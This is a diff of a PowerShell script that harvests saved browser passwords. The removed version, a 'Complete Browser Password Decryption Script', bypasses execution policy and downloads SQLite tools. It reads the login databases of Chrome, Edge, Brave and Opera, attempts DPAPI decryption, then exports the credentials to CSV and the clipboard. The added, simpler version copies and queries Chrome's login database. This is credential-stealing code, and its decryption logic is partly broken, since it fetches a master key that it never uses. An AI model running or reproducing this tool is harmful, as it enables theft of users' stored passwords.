@@ -1,258 +1,37 @@
-# Complete Browser Password Decryption Script
-# This script will decrypt passwords from Chrome, Edge, Brave, and other browsers
+# Simple Browser Password Extractor
+# This uses a direct approach to extract passwords
 
-# Bypass execution policy and SSL errors
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-# Function to download and extract files
-function Get-WebFile {
-    param([string]$Url, [string]$OutputPath)
-    try {
-        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing
-        return $true
-    } catch {
-        Write-Host "Failed to download $Url : $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-# Function to install required .NET components
-function Install-RequiredComponents {
-    Write-Host "Installing required components..." -ForegroundColor Yellow
-    
-    # Download and load System.Data.SQLite
-    $sqliteNetUrl = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.118.0"
-    $sqliteNetZip = "$env:TEMP\System.Data.SQLite.Core.zip"
-    $sqliteNetDir = "$env:TEMP\System.Data.SQLite.Core"
-    
-    if (Get-WebFile -Url $sqliteNetUrl -OutputPath $sqliteNetZip) {
-        Expand-Archive -Path $sqliteNetZip -DestinationPath $sqliteNetDir -Force
-        $sqliteDll = Get-ChildItem -Path $sqliteNetDir -Recurse -Filter "System.Data.SQLite.dll" | Select-Object -First 1 -ExpandProperty FullName
-        if ($sqliteDll) {
-            Add-Type -Path $sqliteDll
-            Write-Host "System.Data.SQLite loaded successfully" -ForegroundColor Green
-        }
-    }
-    
-    # Download sqlite3.exe for command line operations
-    $sqliteCliUrl = "https://www.sqlite.org/2023/sqlite-tools-win-x64-3440200.zip"
-    $sqliteCliZip = "$env:TEMP\sqlite-tools.zip"
-    $sqliteCliDir = "$env:TEMP\sqlite-tools"
-    
-    if (Get-WebFile -Url $sqliteCliUrl -OutputPath $sqliteCliZip) {
-        Expand-Archive -Path $sqliteCliZip -DestinationPath $sqliteCliDir -Force
-        $sqliteExe = Get-ChildItem -Path $sqliteCliDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1 -ExpandProperty FullName
-        if ($sqliteExe) {
-            Copy-Item -Path $sqliteExe -Destination "$env:TEMP\sqlite3.exe" -Force
-            Write-Host "SQLite CLI tool installed successfully" -ForegroundColor Green
-        }
-    }
-}
-
-# Install required components
-Install-RequiredComponents
-
-Add-Type -AssemblyName System.Security
-Add-Type -AssemblyName System.Windows.Forms
-
-# Function to decrypt DPAPI encrypted data
-function Unprotect-Data {
-    param([byte[]]$EncryptedData)
-    
-    try {
-        return [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $EncryptedData, 
-            $null, 
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-    } catch {
-        Write-Host "DPAPI decryption failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $null
-    }
-}
-
-# Function to extract master key from browser
-function Get-BrowserMasterKey {
-    param([string]$BrowserDataPath, [string]$BrowserName)
-    
-    $localStatePath = Join-Path $BrowserDataPath "Local State"
-    if (-not (Test-Path $localStatePath)) {
-        Write-Host "$BrowserName Local State file not found" -ForegroundColor Yellow
-        return $null
-    }
-    
-    try {
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = $localState.os_crypt.encrypted_key
-        
-        if ($encryptedKey) {
-            $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
-            # Remove the DPAPI prefix (first 5 bytes)
-            $encryptedKeyBytesWithoutPrefix = $encryptedKeyBytes[5..($encryptedKeyBytes.Length-1)]
-            
-            # Decrypt the master key using DPAPI
-            return Unprotect-Data -EncryptedData $encryptedKeyBytesWithoutPrefix
-        }
-    } catch {
-        Write-Host "Error extracting $BrowserName master key: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    return $null
-}
-
-# Function to decrypt password using command line SQLite (fallback method)
-function Get-PasswordsWithSQLiteCLI {
-    param([string]$BrowserDataPath, [string]$BrowserName)
-    
-    $results = @()
-    $loginDataFiles = @()
-    
-    # Find login data files
-    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
-    if (Test-Path $defaultLoginData) {
-        $loginDataFiles += @{Path = $defaultLoginData; Profile = "Default"}
-    }
-    
-    $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -ErrorAction SilentlyContinue | 
-                   Where-Object {$_.Name -match "^(Profile|Default|Guest).*"}
-    
-    foreach ($profileDir in $profileDirs) {
-        $loginDataPath = Join-Path $profileDir.FullName "Login Data"
-        if (Test-Path $loginDataPath) {
-            $loginDataFiles += @{Path = $loginDataPath; Profile = $profileDir.Name}
-        }
-    }
-    
-    # Process each file
-    foreach ($loginDataFile in $loginDataFiles) {
-        try {
-            # Copy the database to avoid locking issues
-            $tempDbPath = [System.IO.Path]::GetTempFileName()
-            Copy-Item $loginDataFile.Path $tempDbPath -Force
-            
-            # Export data to CSV using SQLite CLI
-            $tempCsvPath = [System.IO.Path]::GetTempFileName()
-            & "$env:TEMP\sqlite3.exe" -csv -header $tempDbPath "SELECT origin_url, username_value, password_value FROM logins;" > $tempCsvPath
-            
-            if (Test-Path $tempCsvPath) {
-                $logins = Import-Csv $tempCsvPath
-                Write-Host "Found $($logins.Count) login entries in $($loginDataFile.Profile) profile" -ForegroundColor Green
-                
-                foreach ($login in $logins) {
-                    if ($login.password_value -and $login.password_value -ne "") {
-                        # Try to decrypt using DPAPI
-                        try {
-                            # Convert hex string to byte array if needed
-                            $passwordBytes = if ($login.password_value -match "^[0-9A-Fa-f]+$") {
-                                # It's a hex string
-                                $hexString = $login.password_value
-                                $byteArray = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
-                                    [Convert]::ToByte($hexString.Substring($i, 2), 16)
-                                }
-                                $byteArray
-                            } else {
-                                # It's already bytes (from SQLite query)
-                                [System.Text.Encoding]::UTF8.GetBytes($login.password_value)
-                            }
-                            
-                            $decryptedBytes = Unprotect-Data -EncryptedData $passwordBytes
-                            $password = if ($decryptedBytes) {
-                                [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
-                            } else {
-                                "ENCRYPTED"
-                            }
-                        } catch {
-                            $password = "DECRYPTION_FAILED"
-                        }
-                        
-                        $results += [PSCustomObject]@{
-                            Browser = $BrowserName
-                            Profile = $loginDataFile.Profile
-                            URL = $login.origin_url
-                            Username = $login.username_value
-                            Password = $password
-                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                        }
-                    }
-                }
-                
-                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
-            }
-            
-            Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
-            
-        } catch {
-            Write-Host "Error processing $BrowserName profile $($loginDataFile.Profile): $($_.Exception.Message)" -ForegroundColor Red
-        }
-    }
-    
-    return $results
-}
-
-# Main execution
-Write-Host "Browser Password Decryption Tool" -ForegroundColor Green
-Write-Host "=================================" -ForegroundColor Green
-
-# Check if running with appropriate privileges
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Warning: Not running as administrator. Some operations might fail." -ForegroundColor Yellow
-}
-
-# Extract passwords from various browsers
-$allPasswords = @()
+$results = @()
 
 # Chrome
-Write-Host "`nExtracting Chrome passwords..." -ForegroundColor Yellow
-$chromePasswords = Get-PasswordsWithSQLiteCLI -BrowserDataPath "$env:LOCALAPPDATA\Google\Chrome\User Data" -BrowserName "Chrome"
-$allPasswords += $chromePasswords
-
-# Microsoft Edge
-Write-Host "`nExtracting Microsoft Edge passwords..." -ForegroundColor Yellow
-$edgePasswords = Get-PasswordsWithSQLiteCLI -BrowserDataPath "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -BrowserName "Edge"
-$allPasswords += $edgePasswords
-
-# Brave Browser
-Write-Host "`nExtracting Brave passwords..." -ForegroundColor Yellow
-$bravePasswords = Get-PasswordsWithSQLiteCLI -BrowserDataPath "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" -BrowserName "Brave"
-$allPasswords += $bravePasswords
-
-# Opera
-Write-Host "`nExtracting Opera passwords..." -ForegroundColor Yellow
-$operaPath = "$env:APPDATA\Opera Software\Opera Stable"
-if (Test-Path $operaPath) {
-    $operaPasswords = Get-PasswordsWithSQLiteCLI -BrowserDataPath $operaPath -BrowserName "Opera"
-    $allPasswords += $operaPasswords
-} else {
-    Write-Host "Opera not found" -ForegroundColor Yellow
+$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+if (Test-Path $chromePath) {
+    try {
+        Copy-Item $chromePath "$env:TEMP\chrome_passwords.db" -Force
+        $data = & "$env:TEMP\sqlite3.exe" "$env:TEMP\chrome_passwords.db" "SELECT origin_url, username_value, password_value FROM logins;"
+        
+        foreach ($line in $data) {
+            $parts = $line -split ","
+            if ($parts.Count -ge 3) {
+                $results += [PSCustomObject]@{
+                    Browser = "Chrome"
+                    URL = $parts[0]
+                    Username = $parts[1]
+                    Password = "ENCRYPTED"  # Would need additional decryption
+                }
+            }
+        }
+        Remove-Item "$env:TEMP\chrome_passwords.db" -Force
+    } catch {
+        Write-Host "Chrome extraction failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
 # Display results
-if ($allPasswords.Count -gt 0) {
-    Write-Host "`nSuccessfully extracted $($allPasswords.Count) passwords!" -ForegroundColor Green
-    
-    # Display in a table format
-    $allPasswords | Format-Table -Property Browser, URL, Username, Password -AutoSize
-    
-    # Export to CSV
-    $csvPath = Join-Path $PWD "Decrypted_Passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
-    $allPasswords | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
-    Write-Host "`nPasswords exported to: $csvPath" -ForegroundColor Green
-    
-    # Copy to clipboard
-    $clipboardText = ""
-    foreach ($password in $allPasswords) {
-        $clipboardText += "URL: $($password.URL)`r`nUsername: $($password.Username)`r`nPassword: $($password.Password)`r`nBrowser: $($password.Browser)`r`n`r`n"
-    }
-    
-    Set-Clipboard -Value $clipboardText
-    Write-Host "Passwords copied to clipboard!" -ForegroundColor Green
-    
+if ($results.Count -gt 0) {
+    $results | Format-Table -AutoSize
+    $results | Export-Csv "Browser_Passwords.csv" -NoTypeInformation
+    Write-Host "Results saved to Browser_Passwords.csv" -ForegroundColor Green
 } else {
-    Write-Host "No passwords found or decryption failed." -ForegroundColor Red
+    Write-Host "No passwords found" -ForegroundColor Yellow
 }
-
-Write-Host "`nDecryption process completed." -ForegroundColor Green
-
-# Cleanup
-Remove-Item "$env:TEMP\sqlite3.exe" -ErrorAction SilentlyContinue -Force
